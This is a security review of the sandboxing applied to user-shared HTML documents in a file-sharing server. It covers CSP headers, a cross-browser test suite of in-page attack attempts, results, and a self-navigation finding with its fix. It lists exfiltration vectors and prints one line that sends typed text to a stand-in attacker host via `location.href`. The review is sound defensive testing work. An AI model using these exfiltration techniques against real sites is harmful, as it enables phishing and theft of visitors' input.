# HTML frame security review

Hive Drive Server shares user-written HTML documents. A document runs its own
script in a visitor's browser. This review checks that the document cannot
reach the network, the Hive Drive page around it, or the visitor's session.

## Decision

HTML sharing stays enabled. Every automated check passes in Chromium,
Firefox, and WebKit.

The review found one escape that the headers alone did not close: a
document opened as a top-level page could navigate itself to any URL. The
raw route now refuses that request (see "Finding"). No gate on
`Shares.Create` is needed.

The manual browser checks below are pending. A maintainer must run them
before the first release that ships the server.

## Defences under test

| Layer | Value |
| --- | --- |
| Raw response CSP (`/s/{slug}/raw`, `?raw=1`) | `default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; font-src data:; connect-src 'none'; form-action 'none'; frame-src 'none'; base-uri 'none'; frame-ancestors 'self'; sandbox allow-scripts` |
| Raw response other headers | `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`, `Cache-Control: private, no-store`, `X-Robots-Tag: noindex` |
| Page CSP (SPA shell) | `default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; frame-src 'self'; frame-ancestors 'none'; base-uri 'none'; form-action 'self'` |
| Iframe attribute | `sandbox="allow-scripts"` with `referrerpolicy="no-referrer"` |
| Stored document served through the API (no `?raw=1`) | `Content-Security-Policy: sandbox` |
| Top-level request refusal | HTML on a raw route answers 403 when `Sec-Fetch-Dest` is not empty, `iframe`, or `empty` |

The iframe has no `allow-same-origin`, so the document gets an opaque
origin. The page CSP `frame-src 'self'` also applies to navigation inside
the frame.

## How it was tested

`mise run drive-server:e2e` builds the frontend and `hive-drive-server` in
the pinned Playwright image (the same image as `desktop:e2e`), then runs
`cmd/drive-server/e2e/`.

- The container has no network (`--network none`). Only loopback works.
- The server starts with a temporary data directory and `--dev-log-mail`.
  The suite signs in through the API with the code from the server log.
- A canary HTTP listener on a second port records every HTTP request,
  WebSocket upgrade, and bare TCP connection. Any hit is a failure.
- `hostile.html` tries each attack and writes the outcome into its own DOM.
  `nav-*.html` documents try to navigate the frame, the page, or the top
  window.
- Each run checks four things: no canary hit, no request outside the server
  origin that was not blocked, no secret from the embedding page readable
  from the frame, and no navigation of the page away.
- The embedding page holds planted secrets: a non-HttpOnly cookie, a
  `localStorage` value, and a DOM attribute. The session cookie is
  HttpOnly.

Attacks in `hostile.html`: `fetch` (canary and the server origin), XHR,
`WebSocket`, `navigator.sendBeacon`, `<img>` element and markup (`src`,
`srcset`), CSS `url()` (stylesheet link, `@import`, `background`,
`@font-face`, style property, style attribute), `<script src>`,
`<iframe src>`, `window.open`, `document.cookie`, `localStorage`,
`parent.document` (cookie and DOM), `parent.localStorage`,
`parent.location`, and `top.document`.

Attacks in the `nav-*` documents: `location.href =`, `location.replace`,
`<meta http-equiv="refresh">`, `<a>.click()`, `<form>` submit, and
`top.location =`.

Views covered:

| View | How the suite opens it |
| --- | --- |
| Public share `/s/{slug}` | Anonymous browser context, document in the iframe |
| Signed-in document view `/shared/{path}` | Signed-in context, document in the iframe |
| `/s/{slug}/raw` and `?raw=1` as a top-level page | Refused with 403 (see below) |
| The same two responses, forced to render top level | The test answers the browser request with the real response, so only the CSP is in effect |

## Results

Engines: Chromium, Firefox, WebKit (Playwright 1.62.1). 60 tests, 60 passed
(20 per engine).

| Check | Chromium | Firefox | WebKit |
| --- | --- | --- | --- |
| Framed, public share: no attack escapes, canary quiet, frame origin `null` | pass | pass | pass |
| Framed, signed-in view: same | pass | pass | pass |
| Framed, 6 navigation documents, both views: canary quiet, page not navigated | pass | pass | pass |
| Top level, CSP only: origin `null`, cookie and storage unreadable, no network | pass | pass | pass |
| Top level, real request: refused with 403, no document script runs | pass | pass | pass |

Chromium also reported a `securitypolicyviolation` for `connect-src`,
`img-src`, `style-src-elem`, `font-src`, `script-src-elem`, and `frame-src`
inside the frame. Chromium emits a request event for a request that CSP
blocks, then a failure. The suite therefore counts a request outside the
server origin as an escape only when it got a response or did not fail.

Attacks that give no event in the document (beacon, markup images, CSS
`url()`, `<iframe src>`) are judged by the canary alone.

## Finding

A CSP `sandbox` does not stop a document from navigating itself.
`location.href = 'https://attacker.example/?' + typed` works in a top-level
sandboxed document in all three engines. The suite keeps a test that shows
it (`the CSP sandbox alone does not stop a document navigating itself`).

Inside the iframe the same navigation is blocked by the page CSP
`frame-src 'self'`, so the shared link in the Hive Drive page is safe. The
raw URL opened directly was not: a visitor could see a fake login form
and the page could send the typed text away.

Fix: `writeRaw` refuses an HTML document when `Sec-Fetch-Dest` is present
and is not `iframe` or `empty`. All current browsers send the header. The
CLI and other non-browser clients send none and still get the body. The
Go test `TestRawRefusesHTMLOpenedAsAPage` covers the rule.

Limits that remain:

- A browser that sends no `Sec-Fetch-Dest` (older than Chrome 80, Firefox
  90, Safari 16.4) can still open the raw URL as a page and has the
  self-navigation gap.
- A document can draw a fake login page inside the frame. It cannot send
  what the visitor types. The page around the frame names the owner and
  says the content is user content.
- A document that loads a library from a CDN does not render. This is by
  design.
- The suite runs in containers without network. It proves the browser
  blocked the request, not that the host could not route it.

## Manual verification

Pending: run by a maintainer. The automated suite cannot drive the real
desktop browsers. For each browser, upload the `hostile.html` document built in
`cmd/drive-server/e2e/tests/hostile.ts` as an HTML document, share it, run a
listener on a second port (for example `python3 -m http.server 9141`), and
edit the canary address in the document to match.

| Check | Chrome | Firefox | Safari |
| --- | --- | --- | --- |
| Public share view: the listener sees no request | pending: run by a maintainer | pending: run by a maintainer | pending: run by a maintainer |
| Signed-in view: the listener sees no request | pending: run by a maintainer | pending: run by a maintainer | pending: run by a maintainer |
| Results block in the document shows no `escaped` entry | pending: run by a maintainer | pending: run by a maintainer | pending: run by a maintainer |
| `window.open` and `top.location =` do nothing | pending: run by a maintainer | pending: run by a maintainer | pending: run by a maintainer |
| `/s/{slug}/raw` typed into the address bar answers 403 | pending: run by a maintainer | pending: run by a maintainer | pending: run by a maintainer |
| The page URL and session stay unchanged after the document loads | pending: run by a maintainer | pending: run by a maintainer | pending: run by a maintainer |
